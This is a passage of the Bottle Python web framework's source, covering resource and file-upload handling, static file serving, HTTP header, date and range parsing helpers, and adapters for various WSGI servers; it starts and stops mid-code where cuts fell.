keys.\n\n            Changes are propagated recursively and depth-first. A failing\n            on-change handler in an overlay stops the propagation of virtual\n            values and may result in an partly updated tree. Take extra care\n            here and make sure that on-change handlers never fail.\n\n            Used by Route.config\n        \"\"\"\n        # Cleanup dead references\n        self._overlays[:] = [ref for ref in self._overlays if ref() is not None]\n\n        overlay = ConfigDict()\n        overlay._meta = self._meta\n        overlay._source = self\n        self._overlays.append(weakref.ref(overlay))\n        for key in self:\n            overlay._set_virtual(key, self[key])\n        return overlay\n\n\n\n\nclass AppStack(list):\n    \"\"\" A stack-like list. Calling it returns the head of the stack. \"\"\"\n\n    def __call__(self):\n        \"\"\" Return the current default application. \"\"\"\n        return self.default\n\n    def push(self, value=None):\n        \"\"\" Add a new :class:`Bottle` instance to the stack \"\"\"\n        if not isinstance(value, Bottle):\n            value = Bottle()\n        self.append(value)\n        return value\n    new_app = push\n\n    @property\n    def default(self):\n        try:\n            return self[-1]\n        except IndexError:\n            return self.push()\n\n\nclass WSGIFileWrapper(object):\n    def __init__(self, fp, buffer_size=1024 * 64):\n        self.fp, self.buffer_size = fp, buffer_size\n        for attr in 'fileno', 'close', 'read', 'readlines', 'tell', 'seek':\n            if hasattr(fp, attr): setattr(self, attr, getattr(fp, attr))\n\n    def __iter__(self):\n        buff, read = self.buffer_size, self.read\n        part = read(buff)\n        while part:\n            yield part\n            part = read(buff)\n\n\nclass _closeiter(object):\n    \"\"\" This only exists to be able to attach a .close method to iterators that\n        do not support attribute assignment (most of itertools). \"\"\"\n\n    def __init__(self, iterator, close=None):\n        self.iterator = iterator\n        self.close_callbacks = makelist(close)\n\n    def __iter__(self):\n        return iter(self.iterator)\n\n    def close(self):\n        for func in self.close_callbacks:\n            func()\n\n\nclass ResourceManager(object):\n    \"\"\" This class manages a list of search paths and helps to find and open\n        application-bound resources (files).\n\n        :param base: default value for :meth:`add_path` calls.\n        :param opener: callable used to open resources.\n        :param cachemode: controls which lookups are cached. One of 'all',\n                         'found' or 'none'.\n    \"\"\"\n\n    def __init__(self, base='./', opener=open, cachemode='all'):\n        self.opener = opener\n        self.base = base\n        self.cachemode = cachemode\n\n        #: A list of search paths. See :meth:`add_path` for details.\n        self.path = []\n        #: A cache for resolved paths. ``res.cache.clear()`` clears the cache.\n        self.cache = {}\n\n    def add_path(self, path, base=None, index=None, create=False):\n        \"\"\" Add a new path to the list of search paths. Return False if the\n            path does not exist.\n\n            :param path: The new search path. Relative paths are turned into\n                an absolute and normalized form. If the path looks like a file\n                (not ending in `/`), the filename is stripped off.\n            :param base: Path used to absolutize relative search paths.\n                Defaults to :attr:`base` which defaults to ``os.getcwd()``.\n            :param index: Position within the list of search paths. Defaults\n                to last index (appends to the list).\n\n            The `base` parameter makes it easy to reference files installed\n            along with a python module or package::\n\n                res.add_path('./resources/', __file__)\n        \"\"\"\n        base = os.path.abspath(os.path.dirname(base or self.base))\n        path = os.path.abspath(os.path.join(base, os.path.dirname(path)))\n        path += os.sep\n        if path in self.path:\n            self.path.remove(path)\n        if create and not os.path.isdir(path):\n            os.makedirs(path)\n        if index is None:\n            self.path.append(path)\n        else:\n            self.path.insert(index, path)\n        self.cache.clear()\n        return os.path.exists(path)\n\n    def __iter__(self):\n        \"\"\" Iterate over all existing files in all registered paths. \"\"\"\n        search = self.path[:]\n        while search:\n            path = search.pop()\n            if not os.path.isdir(path): continue\n            for name in os.listdir(path):\n                full = os.path.join(path, name)\n                if os.path.isdir(full): search.append(full)\n                else: yield full\n\n    def lookup(self, name):\n        \"\"\" Search for a resource and return an absolute file path, or `None`.\n\n            The :attr:`path` list is searched in order. The first match is\n            returned. Symlinks are followed. The result is cached to speed up\n            future lookups. \"\"\"\n        if name not in self.cache or DEBUG:\n            for path in self.path:\n                fpath = os.path.join(path, name)\n                if os.path.isfile(fpath):\n                    if self.cachemode in ('all', 'found'):\n                        self.cache[name] = fpath\n                    return fpath\n            if self.cachemode == 'all':\n                self.cache[name] = None\n        return self.cache[name]\n\n    def open(self, name, mode='r', *args, **kwargs):\n        \"\"\" Find a resource and return a file object, or raise IOError. \"\"\"\n        fname = self.lookup(name)\n        if not fname: raise IOError(\"Resource %r not found.\" % name)\n        return self.opener(fname, mode=mode, *args, **kwargs)\n\n\nclass FileUpload(object):\n    def __init__(self, fileobj, name, filename, headers=None):\n        \"\"\" Wrapper for file uploads. \"\"\"\n        #: Open file(-like) object (BytesIO buffer or temporary file)\n        self.file = fileobj\n        #: Name of the upload form field\n        self.name = name\n        #: Raw filename as sent by the client (may contain unsafe characters)\n        self.raw_filename = filename\n        #: A :class:`HeaderDict` with additional headers (e.g. content-type)\n        self.headers = HeaderDict(headers) if headers else HeaderDict()\n\n    content_type = HeaderProperty('Content-Type')\n    content_length = HeaderProperty('Content-Length', reader=int, default=-1)\n\n    def get_header(self, name, default=None):\n        \"\"\" Return the value of a header within the multipart part. \"\"\"\n        return self.headers.get(name, default)\n\n    @cached_property\n    def filename(self):\n        \"\"\" Name of the file on the client file system, but normalized to ensure\n            file system compatibility. An empty filename is returned as 'empty'.\n\n            Only ASCII letters, digits, dashes, underscores and dots are\n            allowed in the final filename. Accents are removed, if possible.\n            Whitespace is replaced by a single dash. Leading or tailing dots\n            or dashes are removed. The filename is limited to 255 characters.\n        \"\"\"\n        fname = self.raw_filename\n        if not isinstance(fname, unicode):\n            fname = fname.decode('utf8', 'ignore')\n        fname = normalize('NFKD', fname)\n        fname = fname.encode('ASCII', 'ignore').decode('ASCII')\n        fname = os.path.basename(fname.replace('\\\\', os.path.sep))\n        fname = re.sub(r'[^a-zA-Z0-9-_.\\s]', '', fname).strip()\n        fname = re.sub(r'[-\\s]+', '-', fname).strip('.-')\n        return fname[:255] or 'empty'\n\n    def _copy_file(self, fp, chunk_size=2 ** 16):\n        read, write, offset = self.file.read, fp.write, self.file.tell()\n        while 1:\n            buf = read(chunk_size)\n            if not buf: break\n            write(buf)\n        self.file.seek(offset)\n\n    def save(self, destination, overwrite=False, chunk_size=2 ** 16):\n        \"\"\" Save file to disk or copy its content to an open file(-like) object.\n            If *destination* is a directory, :attr:`filename` is added to the\n            path. Existing files are not overwritten by default (IOError).\n\n            :param destination: File path, directory or file(-like) object.\n            :param overwrite: If True, replace existing files. (default: False)\n            :param chunk_size: Bytes to read at a time. (default: 64kb)\n        \"\"\"\n        if isinstance(destination, basestring):  # Except file-likes here\n            if os.path.isdir(destination):\n                destination = os.path.join(destination, self.filename)\n            if not overwrite and os.path.exists(destination):\n                raise IOError('File exists.')\n            with open(destination, 'wb') as fp:\n                self._copy_file(fp, chunk_size)\n        else:\n            self._copy_file(destination, chunk_size)\n\n###############################################################################\n# Application Helper ###########################################################\n###############################################################################\n\n\ndef abort(code=500, text='Unknown Error.'):\n    \"\"\" Aborts execution and causes a HTTP error. \"\"\"\n    raise HTTPError(code, text)\n\n\ndef redirect(url, code=None):\n    \"\"\" Aborts execution and causes a 303 or 302 redirect, depending on\n        the HTTP protocol version. \"\"\"\n    if not code:\n        code = 303 if request.get('SERVER_PROTOCOL') == \"HTTP/1.1\" else 302\n    res = response.copy(cls=HTTPResponse)\n    res.status = code\n    res.body = \"\"\n    res.set_header('Location', urljoin(request.url, url))\n    raise res\n\n\ndef _rangeiter(fp, offset, limit, bufsize=1024 * 1024):\n    \"\"\" Yield chunks from a range in a file. \"\"\"\n    fp.seek(offset)\n    while limit > 0:\n        part = fp.read(min(limit, bufsize))\n        if not part:\n            break\n        limit -= len(part)\n        yield part\n\n\ndef static_file(filename, root,\n                mimetype=True,\n                download=False,\n                charset='UTF-8',\n                etag=None,\n                headers=None):\n    \"\"\" Open a file in a safe way and return an instance of :exc:`HTTPResponse`\n        that can be sent back to the client.\n\n        :param filename: Name or path of the file to send, relative to ``root``.\n        :param root: Root path for file lookups. Should be an absolute directory\n            path.\n        :param mimetype: Provide the content-type header (default: guess from\n            file extension)\n        :param download: If True, ask the browser to open a `Save as...` dialog\n            instead of opening the file with the associated program. You can\n            specify a custom filename as a string. If not specified, the\n            original filename is used (default: False).\n        :param charset: The charset for files with a ``text/*`` mime-type.\n            (default: UTF-8)\n        :param etag: Provide a pre-computed ETag header. If set to ``False``,\n            ETag handling is disabled. (default: auto-generate ETag header)\n        :param headers: Additional headers dict to add to the response.\n\n        While checking user input is always a good idea, this function provides\n        additional protection against malicious ``filename`` parameters from\n        breaking out of the ``root`` directory and leaking sensitive information\n        to an attacker.\n\n        Read-protected files or files outside of the ``root`` directory are\n        answered with ``403 Access Denied``. Missing files result in a\n        ``404 Not Found`` response. Conditional requests (``If-Modified-Since``,\n        ``If-None-Match``) are answered with ``304 Not Modified`` whenever\n        possible. ``HEAD`` and ``Range`` requests (used by download managers to\n        check or continue partial downloads) are also handled automatically.\n\n    \"\"\"\n\n    root = os.path.join(os.path.abspath(root), '')\n    filename = os.path.abspath(os.path.join(root, filename.strip('/\\\\')))\n    headers = headers.copy() if headers else {}\n\n    if not filename.startswith(root):\n        return HTTPError(403, \"Access denied.\")\n    if not os.path.exists(filename) or not os.path.isfile(filename):\n        return HTTPError(404, \"File does not exist.\")\n    if not os.access(filename, os.R_OK):\n        return HTTPError(403, \"You do not have permission to access this file.\")\n\n    if mimetype is True:\n        if download and download is not True:\n            mimetype, encoding = mimetypes.guess_type(download)\n        else:\n            mimetype, encoding = mimetypes.guess_type(filename)\n        if encoding:\n            headers['Content-Encoding'] = encoding\n\n    if mimetype:\n        if (mimetype[:5] == 'text/' or mimetype == 'application/javascript')\\\n          and charset and 'charset' not in mimetype:\n            mimetype += '; charset=%s' % charset\n        headers['Content-Type'] = mimetype\n\n    if download:\n        download = os.path.basename(filename if download is True else download)\n        headers['Content-Disposition'] = 'attachment; filename=\"%s\"' % download\n\n    stats = os.stat(filename)\n    headers['Content-Length'] = clen = stats.st_size\n    headers['Last-Modified'] = email.utils.formatdate(stats.st_mtime,\n                                                      usegmt=True)\n    headers['Date'] = email.utils.formatdate(time.time(), usegmt=True)\n\n    getenv = request.environ.get\n\n    if etag is None:\n        etag = '%d:%d:%d:%d:%s' % (stats.st_dev, stats.st_ino, stats.st_mtime,\n                                   clen, filename)\n        etag = hashlib.sha1(tob(etag)).hexdigest()\n\n    if etag:\n        headers['ETag'] = etag\n        check = getenv('HTTP_IF_NONE_MATCH')\n        if check and check == etag:\n            return HTTPResponse(status=304, **headers)\n\n    ims = getenv('HTTP_IF_MODIFIED_SINCE')\n    if ims:\n        ims = parse_date(ims.split(\";\")[0].strip())\n        if ims is not None and ims >= int(stats.st_mtime):\n            return HTTPResponse(status=304, **headers)\n\n    body = '' if request.method == 'HEAD' else open(filename, 'rb')\n\n    headers[\"Accept-Ranges\"] = \"bytes\"\n    range_header = getenv('HTTP_RANGE')\n    if range_header:\n        ranges = list(parse_range_header(range_header, clen))\n        if not ranges:\n            return HTTPError(416, \"Requested Range Not Satisfiable\")\n        offset, end = ranges[0]\n        rlen = end - offset\n        headers[\"Content-Range\"] = \"bytes %d-%d/%d\" % (offset, end - 1, clen)\n        headers[\"Content-Length\"] = str(rlen)\n        if body: body = _closeiter(_rangeiter(body, offset, rlen), body.close)\n        return HTTPResponse(body, status=206, **headers)\n    return HTTPResponse(body, **headers)\n\n###############################################################################\n# HTTP Utilities and MISC (TODO) ###############################################\n###############################################################################\n\n\ndef debug(mode=True):\n    \"\"\" Change the debug level.\n    There is only one debug level supported at the moment.\"\"\"\n    global DEBUG\n    if mode: warnings.simplefilter('default')\n    DEBUG = bool(mode)\n\n\ndef http_date(value):\n    if isinstance(value, basestring):\n        return value\n    if isinstance(value, datetime):\n        # aware datetime.datetime is converted to UTC time\n        # naive datetime.datetime is treated as UTC time\n        value = value.utctimetuple()\n    elif isinstance(value, datedate):\n        # datetime.date is naive, and is treated as UTC time\n        value = value.timetuple()\n    if not isinstance(value, (int, float)):\n        # convert struct_time in UTC to UNIX timestamp\n        value = calendar.timegm(value)\n    return email.utils.formatdate(value, usegmt=True)\n\n\ndef parse_date(ims):\n    \"\"\" Parse rfc1123, rfc850 and asctime timestamps and return UTC epoch. \"\"\"\n    try:\n        ts = email.utils.parsedate_tz(ims)\n        return calendar.timegm(ts[:8] + (0, )) - (ts[9] or 0)\n    except (TypeError, ValueError, IndexError, OverflowError):\n        return None\n\n\ndef parse_auth(header):\n    \"\"\" Parse rfc2617 HTTP authentication header string (basic) and return (user,pass) tuple or None\"\"\"\n    try:\n        method, data = header.split(None, 1)\n        if method.lower() == 'basic':\n            user, pwd = touni(base64.b64decode(tob(data))).split(':', 1)\n            return user, pwd\n    except (KeyError, ValueError):\n        return None\n\n\ndef parse_range_header(header, maxlen=0):\n    \"\"\" Yield (start, end) ranges parsed from a HTTP Range header. Skip\n        unsatisfiable ranges. The end index is non-inclusive.\"\"\"\n    if not header or header[:6] != 'bytes=': return\n    ranges = [r.split('-', 1) for r in header[6:].split(',') if '-' in r]\n    for start, end in ranges:\n        try:\n            if not start:  # bytes=-100    -> last 100 bytes\n                start, end = max(0, maxlen - int(end)), maxlen\n            elif not end:  # bytes=100-    -> all but the first 99 bytes\n                start, end = int(start), maxlen\n            else:  # bytes=100-200 -> bytes 100-200 (inclusive)\n                start, end = int(start), min(int(end) + 1, maxlen)\n            if 0 <= start < end <= maxlen:\n                yield start, end\n        except ValueError:\n            pass\n\n\n#: Header tokenizer used by _parse_http_header()\n_hsplit = re.compile('(?:(?:\"((?:[^\"\\\\\\\\]|\\\\\\\\.)*)\")|([^;,=]+))([;,=]?)').findall\n\ndef _parse_http_header(h):\n    \"\"\" Parses a typical multi-valued and parametrised HTTP header (e.g. Accept headers) and returns a list of values\n        and parameters. For non-standard or broken input, this implementation may return partial results.\n    :param h: A header string (e.g. ``text/html,text/plain;q=0.9,*/*;q=0.8``)\n    :return: List of (value, params) tuples. The second element is a (possibly empty) dict.\n    \"\"\"\n    values = []\n    if '\"' not in h:  # INFO: Fast path without regexp (~2x faster)\n        for value in h.split(','):\n            parts = value.split(';')\n            values.append((parts[0].strip(), {}))\n            for attr in parts[1:]:\n                name, value = attr.split('=', 1)\n                values[-1][1][name.strip()] = value.strip()\n    else:\n        lop, key, attrs = ',', None, {}\n        for quoted, plain, tok in _hsplit(h):\n            value = plain.strip() if plain else quoted.replace('\\\\\"', '\"')\n            if lop == ',':\n                attrs = {}\n                values.append((value, attrs))\n            elif lop == ';':\n                if tok == '=':\n                    key = value\n                else:\n                    attrs[value] = ''\n            elif lop == '=' and key:\n                attrs[key] = value\n                key = None\n            lop = tok\n    return values\n\n\ndef _parse_qsl(qs):\n    r = []\n    for pair in qs.split('&'):\n        if not pair: continue\n        nv = pair.split('=', 1)\n        if len(nv) != 2: nv.append('')\n        key = urlunquote(nv[0].replace('+', ' '))\n        value = urlunquote(nv[1].replace('+', ' '))\n        r.append((key, value))\n    return r\n\n\ndef _lscmp(a, b):\n    \"\"\" Compares two strings in a cryptographically safe way:\n        Runtime is not affected by length of common prefix. \"\"\"\n    return not sum(0 if x == y else 1\n                   for x, y in zip(a, b)) and len(a) == len(b)\n\n\ndef cookie_encode(data, key, digestmod=None):\n    \"\"\" Encode and sign a pickle-able object. Return a (byte) string \"\"\"\n    depr(0, 13, \"cookie_encode() will be removed soon.\",\n                \"Do not use this API directly.\")\n    digestmod = digestmod or hashlib.sha256\n    msg = base64.b64encode(pickle.dumps(data, -1))\n    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=digestmod).digest())\n    return tob('!') + sig + tob('?') + msg\n\n\ndef cookie_decode(data, key, digestmod=None):\n    \"\"\" Verify and decode an encoded string. Return an object or None.\"\"\"\n    depr(0, 13, \"cookie_decode() will be removed soon.\",\n                \"Do not use this API directly.\")\n    data = tob(data)\n    if cookie_is_encoded(data):\n        sig, msg = data.split(tob('?'), 1)\n        digestmod = digestmod or hashlib.sha256\n        hashed = hmac.new(tob(key), msg, digestmod=digestmod).digest()\n        if _lscmp(sig[1:], base64.b64encode(hashed)):\n            return pickle.loads(base64.b64decode(msg))\n    return None\n\n\ndef cookie_is_encoded(data):\n    \"\"\" Return True if the argument looks like a encoded cookie.\"\"\"\n    depr(0, 13, \"cookie_is_encoded() will be removed soon.\",\n                \"Do not use this API directly.\")\n    return bool(data.startswith(tob('!')) and tob('?') in data)\n\n\ndef html_escape(string):\n    \"\"\" Escape HTML special characters ``&<>`` and quotes ``'\"``. \"\"\"\n    return string.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\\\n                 .replace('\"', '&quot;').replace(\"'\", '&#039;')\n\n\ndef html_quote(string):\n    \"\"\" Escape and quote a string to be used as an HTTP attribute.\"\"\"\n    return '\"%s\"' % html_escape(string).replace('\\n', '&#10;')\\\n                    .replace('\\r', '&#13;').replace('\\t', '&#9;')\n\n\ndef yieldroutes(func):\n    \"\"\" Return a generator for routes that match the signature (name, args)\n    of the func parameter. This may yield more than one route if the function\n    takes optional keyword arguments. The output is best described by example::\n\n        a()         -> '/a'\n        b(x, y)     -> '/b/<x>/<y>'\n        c(x, y=5)   -> '/c/<x>' and '/c/<x>/<y>'\n        d(x=5, y=6) -> '/d' and '/d/<x>' and '/d/<x>/<y>'\n    \"\"\"\n    path = '/' + func.__name__.replace('__', '/').lstrip('/')\n    spec = getargspec(func)\n    argc = len(spec[0]) - len(spec[3] or [])\n    path += ('/<%s>' * argc) % tuple(spec[0][:argc])\n    yield path\n    for arg in spec[0][argc:]:\n        path += '/<%s>' % arg\n        yield path\n\n\ndef path_shift(script_name, path_info, shift=1):\n    \"\"\" Shift path fragments from PATH_INFO to SCRIPT_NAME and vice versa.\n\n        :return: The modified paths.\n        :param script_name: The SCRIPT_NAME path.\n        :param script_name: The PATH_INFO path.\n        :param shift: The number of path fragments to shift. May be negative to\n          change the shift direction. (default: 1)\n    \"\"\"\n    if shift == 0: return script_name, path_info\n    pathlist = path_info.strip('/').split('/')\n    scriptlist = script_name.strip('/').split('/')\n    if pathlist and pathlist[0] == '': pathlist = []\n    if scriptlist and scriptlist[0] == '': scriptlist = []\n    if 0 < shift <= len(pathlist):\n        moved = pathlist[:shift]\n        scriptlist = scriptlist + moved\n        pathlist = pathlist[shift:]\n    elif 0 > shift >= -len(scriptlist):\n        moved = scriptlist[shift:]\n        pathlist = moved + pathlist\n        scriptlist = scriptlist[:shift]\n    else:\n        empty = 'SCRIPT_NAME' if shift < 0 else 'PATH_INFO'\n        raise AssertionError(\"Cannot shift. Nothing left from %s\" % empty)\n    new_script_name = '/' + '/'.join(scriptlist)\n    new_path_info = '/' + '/'.join(pathlist)\n    if path_info.endswith('/') and pathlist: new_path_info += '/'\n    return new_script_name, new_path_info\n\n\ndef auth_basic(check, realm=\"private\", text=\"Access denied\"):\n    \"\"\" Callback decorator to require HTTP auth (basic).\n        TODO: Add route(check_auth=...) parameter. \"\"\"\n\n    def decorator(func):\n\n        @functools.wraps(func)\n        def wrapper(*a, **ka):\n            user, password = request.auth or (None, None)\n            if user is None or not check(user, password):\n                err = HTTPError(401, text)\n                err.add_header('WWW-Authenticate', 'Basic realm=\"%s\"' % realm)\n                return err\n            return func(*a, **ka)\n\n        return wrapper\n\n    return decorator\n\n# Shortcuts for common Bottle methods.\n# They all refer to the current default application.\n\n\ndef make_default_app_wrapper(name):\n    \"\"\" Return a callable that relays calls to the current default app. \"\"\"\n\n    @functools.wraps(getattr(Bottle, name))\n    def wrapper(*a, **ka):\n        return getattr(app(), name)(*a, **ka)\n\n    return wrapper\n\n\nroute     = make_default_app_wrapper('route')\nget       = make_default_app_wrapper('get')\npost      = make_default_app_wrapper('post')\nput       = make_default_app_wrapper('put')\ndelete    = make_default_app_wrapper('delete')\npatch     = make_default_app_wrapper('patch')\nerror     = make_default_app_wrapper('error')\nmount     = make_default_app_wrapper('mount')\nhook      = make_default_app_wrapper('hook')\ninstall   = make_default_app_wrapper('install')\nuninstall = make_default_app_wrapper('uninstall')\nurl       = make_default_app_wrapper('get_url')\n\n###############################################################################\n# Server Adapter ###############################################################\n###############################################################################\n\n# Before you edit or add a server adapter, please read:\n# - https://github.com/bottlepy/bottle/pull/647#issuecomment-60152870\n# - https://github.com/bottlepy/bottle/pull/865#issuecomment-242795341\n\nclass ServerAdapter(object):\n    quiet = False\n\n    def __init__(self, host='127.0.0.1', port=8080, **options):\n        self.options = options\n        self.host = host\n        self.port = int(port)\n\n    def run(self, handler):  # pragma: no cover\n        pass\n\n    def __repr__(self):\n        args = ', '.join('%s=%s' % (k, repr(v))\n                          for k, v in self.options.items())\n        return \"%s(%s)\" % (self.__class__.__name__, args)\n\n\nclass CGIServer(ServerAdapter):\n    quiet = True\n\n    def run(self, handler):  # pragma: no cover\n        from wsgiref.handlers import CGIHandler\n\n        def fixed_environ(environ, start_response):\n            environ.setdefault('PATH_INFO', '')\n            return handler(environ, start_response)\n\n        CGIHandler().run(fixed_environ)\n\n\nclass FlupFCGIServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover\n        import flup.server.fcgi\n        self.options.setdefault('bindAddress', (self.host, self.port))\n        flup.server.fcgi.WSGIServer(handler, **self.options).run()\n\n\nclass WSGIRefServer(ServerAdapter):\n    def run(self, app):  # pragma: no cover\n        from wsgiref.simple_server import make_server\n        from wsgiref.simple_server import WSGIRequestHandler, WSGIServer\n        import socket\n\n        class FixedHandler(WSGIRequestHandler):\n            def address_string(self):  # Prevent reverse DNS lookups please.\n                return self.client_address[0]\n\n            def log_request(*args, **kw):\n                if not self.quiet:\n                    return WSGIRequestHandler.log_request(*args, **kw)\n\n        handler_cls = self.options.get('handler_class', FixedHandler)\n        server_cls = self.options.get('server_class', WSGIServer)\n\n        if ':' in self.host:  # Fix wsgiref for IPv6 addresses.\n            if getattr(server_cls, 'address_family') == socket.AF_INET:\n\n                class server_cls(server_cls):\n                    address_family = socket.AF_INET6\n\n        self.srv = make_server(self.host, self.port, app, server_cls,\n                               handler_cls)\n        self.port = self.srv.server_port  # update port actual port (0 means random)\n        try:\n            self.srv.serve_forever()\n        except KeyboardInterrupt:\n            self.srv.server_close()  # Prevent ResourceWarning: unclosed socket\n            raise\n\n\nclass CherryPyServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover\n        depr(0, 13, \"The wsgi server part of cherrypy was split into a new \"\n                    \"project called 'cheroot'.\", \"Use the 'cheroot' server \"\n                    \"adapter instead of cherrypy.\")\n        from cherrypy import wsgiserver # This will fail for CherryPy >= 9\n\n        self.options['bind_addr'] = (self.host, self.port)\n        self.options['wsgi_app'] = handler\n\n        certfile = self.options.get('certfile')\n        if certfile:\n            del self.options['certfile']\n        keyfile = self.options.get('keyfile')\n        if keyfile:\n            del self.options['keyfile']\n\n        server = wsgiserver.CherryPyWSGIServer(**self.options)\n        if certfile:\n            server.ssl_certificate = certfile\n        if keyfile:\n            server.ssl_private_key = keyfile\n\n        try:\n            server.start()\n        finally:\n            server.stop()\n\n\nclass CherootServer(ServerAdapter):\n    def run(self, handler): # pragma: no cover\n        from cheroot import wsgi\n        from cheroot.ssl import builtin\n        self.options['bind_addr'] = (self.host, self.port)\n        self.options['wsgi_app'] = handler\n        certfile = self.options.pop('certfile', None)\n        keyfile = self.options.pop('keyfile', None)\n        chainfile = self.options.pop('chainfile', None)\n        server = wsgi.Server(**self.options)\n        if certfile and keyfile:\n            server.ssl_adapter = builtin.BuiltinSSLAdapter(\n                    certfile, keyfile, chainfile)\n        try:\n            server.start()\n        finally:\n            server.stop()\n\n\nclass WaitressServer(ServerAdapter):\n    def run(self, handler):\n        from waitress import serve\n        serve(handler, host=self.host, port=self.port, _quiet=self.quiet, **self.options)\n\n\nclass PasteServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover\n        from paste import httpserver\n        from paste.translogger import TransLogger\n        handler = TransLogger(handler, setup_console_handler=(not self.quiet))\n        httpserver.serve(handler,\n                         host=self.host,\n                         port=str(self.port), **self.options)\n\n\nclass MeinheldServer(ServerAdapter):\n    def run(self, handler):\n        from meinheld import server\n        server.listen((self.host, self.port))\n        server.run(handler)\n\n\nclass FapwsServer(ServerAdapter):\n    \"\"\" Extremely fast webserver using libev. See https://github.com/william-os4y/fapws3 \"\"\"\n\n    def run(self, handler):  # pragma: no cover\n        depr(0, 13, \"fapws3 is not maintained and support will be dropped.\")\n        import fapws._evwsgi as evwsgi\n        from fapws import base, config\n        port = self.port\n        if float(config.SERVER_IDENT[-2:]) > 0.4:\n            # fapws3 silently changed its API in 0.5\n            port = str(port)\n        evwsgi.start(self.host, port)\n        # fapws3 never releases the GIL. Complain upstream. I tried. No luck.\n        if 'BOTTLE_CHILD' in os.environ and not self.quiet:\n            _stderr(\"WARNING: Auto-reloading does not work with Fapws3.\")\n            _stderr(\"         (Fapws3 breaks python thread support)\")\n        evwsgi.set_base_module(base)\n\n        def app(environ, start_response):\n            environ['wsgi.multiprocess'] = False\n            return handler(environ, start_response)\n\n        evwsgi.wsgi_cb(('', app))\n        evwsgi.run()\n\n\nclass TornadoServer(ServerAdapter):\n    \"\"\" The super hyped asynchronous server by facebook. Untested. \"\"\"\n\n    def run(self, handler):  # pragma: no cover\n        import tornado.wsgi, tornado.httpserver, tornado.ioloop\n        container = tornado.wsgi.WSGIContainer(handler)\n        server = tornado.httpserver.HTTPServer(container)\n        server.listen(port=self.port, address=self.host)\n        tornado.ioloop.IOLoop.instance().start()\n\n\nclass AppEngineServer(ServerAdapter):\n    \"\"\" Adapter for Google App Engine. \"\"\"\n    quiet = True\n\n    def run(self, handler):\n        depr(0, 13, \"AppEngineServer no longer required\",\n             \"Configure your application directly in your app.yaml\")\n        from google.appengine.ext.webapp import util\n        # A main() function in the handler script enables 'App Caching'.\n        # Lets makes sure it is there. This _really_ improves performance.\n        module = sys.modules.get('__main__')\n        if module and not hasattr(module, 'main'):\n            module.main = lambda: util.run_wsgi_app(handler)\n        util.run_wsgi_app(handler)\n\n\nclass TwistedServer(ServerAdapter):\n    \"\"\" Untested. \"\"\"\n\n    def run(self, handler):\n        from twisted.web import server, wsgi\n        from twisted.python.threadpool import ThreadPool\n        from twisted.internet import reactor\n        thread_pool = ThreadPool()\n        thread_pool.start()\n        reactor.addSystemEventTrigger('after', 'shutdown', thread_pool.stop)\n        factory = server.Site(wsgi.WSGIResource(reactor, thread_pool, handler))\n        reactor.listenTCP(self.port, factory, interface=self.host)\n        if not reactor.running:\n            reactor.run()\n\n\nclass DieselServer(ServerAdapter):\n    \"\"\" Untested. \"\"\"\n\n    def run(self, handler):\n        depr(0, 13, \"Diesel is not tested or supported and will be removed.\")\n        from diesel.protocols.wsgi import WSGIApplication\n        app = WSGIApplication(handler, port=self.port)\n        app.run()\n\n\nclass GeventServer(ServerAdapter):\n    \"\"\" Untested. Options:\n\n        * See gevent.wsgi.WSGIServer() documentation for more options.\n    \"\"\"\n\n    def run(self, handler):\n        from gevent import pywsgi, local\n        if not isinstance(threading.local(), local.local):\n            msg = \"Bottle requires gevent.monkey.patch_all() (before import)\"\n            raise RuntimeError(msg)\n        if self.quiet:\n            self.options['log'] = None\n        address = (self.host, self.port)\n        server = pywsgi.WSGIServer(address, handler, **self.options)\n        if 'BOTTLE_CHILD' in os.environ:\n            import signal\n            signal.signal(signal.SIGINT, lambda s, f: server.stop())\n        server.serve_forever()\n\n\nclass GunicornServer(ServerAdapter):\n    \"\"\" Untested. See http://gunicorn.org/configure.html for options. \"\"\"\n\n    def run(self, handler):\n        from gunicorn.app.base import BaseApplication\n\n        if self.host.startswith(\"unix:\"):\n            config = {'bind': self.host}\n        else:\n            config = {'bind': \"%s:%d\" % (self.host, self.port)}\n\n        config.update(self.options)\n\n        class GunicornApplication(BaseApplication):\n            def load_config(self):\n                for key, value in config.items():\n                    self.cfg.set(key, value)\n\n            def load(self):\n                return handler\n\n        GunicornApplication().run()\n\n\nclass EventletServer(ServerAdapter):\n    \"\"\" Untested. Options:\n\n        * `backlog` adjust the eventlet backlog parameter which is the maximum\n          number of queued connections. Should be at least 1; the maximum\n          value is system-dependent.\n        * `family`: (default is 2) socket family, optional. See socket\n          documentation for available families.\n    \"\"\"\n\n    def run(self, handler):\n        from eventlet import wsgi, listen, patcher\n        if not patcher.is_monkey_patched(os):\n            msg = \"Bottle requires eventlet.monkey_patch() (before import)\"\n            raise RuntimeError(msg)\n        socket_args = {}\n        for arg in ('backlog', 'family'):\n            try:\n                socket_args[arg] = self.options.pop(arg)\n            except KeyError:\n                pass\n        address = (self.host, self.port)\n        try:\n            wsgi.server(listen(address, **socket_args), handler,\n                        log_output=(not self.quiet))\n        except TypeError:\n            # Fallback, if we have old version of eventlet\n            wsgi.server(listen(address), handler)\n\n\nclass BjoernServer(ServerAdapter):\n    \"\"\" Fast server written in C: https://github.com/jonashaag/bjoern \"\"\"\n\n    def run(self, handler):\n        from bjoern import run\n        run(handler, self.host, self.port, reuse_port=True)\n\nclass AsyncioServerAdapter(ServerAdapter):\n    \"\"\" Extend ServerAdapter for adding custom event loop \"\"\"\n    def get_event_loop(self):\n        pass\n\nclass AiohttpServer(AsyncioServerAdapter):\n    \"\"\" Asynchronous HTTP client/server framework for asyncio\n        https://pypi.python.org/pypi/aiohttp/\n        https://pypi.org/project/aiohttp-wsgi/\n    \"\"\"\n\n    def get_event_loop(self):\n        import asyncio\n        return asyncio.new_event_loop()\n\n    def run(self, handler):\n        import asyncio\n        from aiohttp_wsgi.wsgi import serve\n        self.loop = self.get_event_loop()\n        asyncio.set_event_loop(self.loop)\n\n        if 'BOTTLE_CHILD' in os.environ:\n            import signal\n            signal.signal(signal.SIGINT, lambda s, f: self.loop.stop())\n\n        serve(handler, host=self.host, port=self.port)\n\n\nclass AiohttpUVLoopServer(AiohttpServer):\n    \"\"\"uvloop\n       https://github.com/MagicStack/uvloop\n    \"\"\"\n    def get_event_loop(self):\n        import uvloop\n        return uvloop.new_event_loop()\n\nclass 